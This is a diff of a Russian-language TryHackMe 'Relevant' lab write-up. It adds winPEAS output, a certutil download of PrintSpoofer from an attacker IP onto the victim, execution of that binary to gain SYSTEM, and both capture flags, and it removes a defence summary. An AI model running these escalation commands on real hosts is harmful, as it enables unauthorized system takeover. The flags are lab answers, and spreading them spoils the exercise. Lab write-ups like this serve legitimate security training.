@@ -249,10 +249,6 @@ Bill
 
 ## 📂 Получение доступа
 
-
-
-## ⚙️ Привилегии
-
 Создаю реверс шелл
 ```
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
@@ -292,27 +288,75 @@ more user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
 
+Информация по машине от winpeas
+```
+          ͹ Basic System Information
+  Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                                                                                                                                                            
+    OS Name: Microsoft Windows Server 2016 Standard Evaluation
+    OS Version: 10.0.14393 N/A Build 14393
+    System Type: x64-based PC
+    Hostname: Relevant
+    ProductName: Windows Server 2016 Standard Evaluation
+    EditionID: ServerStandardEval
+    ReleaseId: 1607
+    BuildBranch: rs1_release
+    CurrentMajorVersionNumber: 10
+    CurrentVersion: 6.3
+    Architecture: AMD64
+    ProcessorCount: 2
+    SystemLang: en-US
+    KeyboardLang: English (United States)
+    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
+    IsVirtualMachine: False
+    Current Time: 7/9/2025 5:46:49 AM
+    HighIntegrity: False
+    PartOfDomain: False
+    Hotfixes: KB3192137 (9/12/2016), KB3211320 (1/7/2017), KB3213986 (1/7/2017),
+```
+
+
+## ⚙️ Привилегии
+
+Первое, что пробую - SeImpersonatePrivilege
+```
+          ͹ Current Token privileges
+  Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation                                                                                                                                                               
+    SeAssignPrimaryTokenPrivilege: DISABLED
+    SeIncreaseQuotaPrivilege: DISABLED
+    SeAuditPrivilege: DISABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+```
+
+Скачиваю `https://github.com/itm4n/PrintSpoofer` и загружаю на жертву
+```
+c:\Users\Public>certutil -urlcache -f http://10.21.104.16:8888/PrintSpoofer64.exe print.exe
+certutil -urlcache -f http://10.21.104.16:8888/PrintSpoofer64.exe print.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+```
+
+Запускаю
+```
+c:\Users\Public>print.exe -i -c "cmd.exe"
+print.exe -i -c "cmd.exe"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+
 ## 🏁 Флаги
 
 - User flag: THM{fdk4ka34vk346ksxfr21tg789ktf45} 
-- Root flag: 
+- Root flag: THM{1fk5kf469devly1gl320zafgl345pv} 
 
 ---
-
-## 📋 Резюме
-
-🧰 **Инструменты:**
-  - nmap, ffuf, и др.
-
-🚨 **Уязвимости, которые удалось обнаружить:**  
-  - Directory Traversal  
-  - RCE через уязвимый скрипт  
-
-🛡 **Советы по защите:**
-  - Использовать сложные пароли и ограничить число попыток входа
-  - Обновлять ПО до актуальных версий
-  - Удалять/ограничивать использование SUID-бинарников
-  - Настроить логирование и мониторинг системных событий
-  - Применять принцип наименьших привилегий
-
-
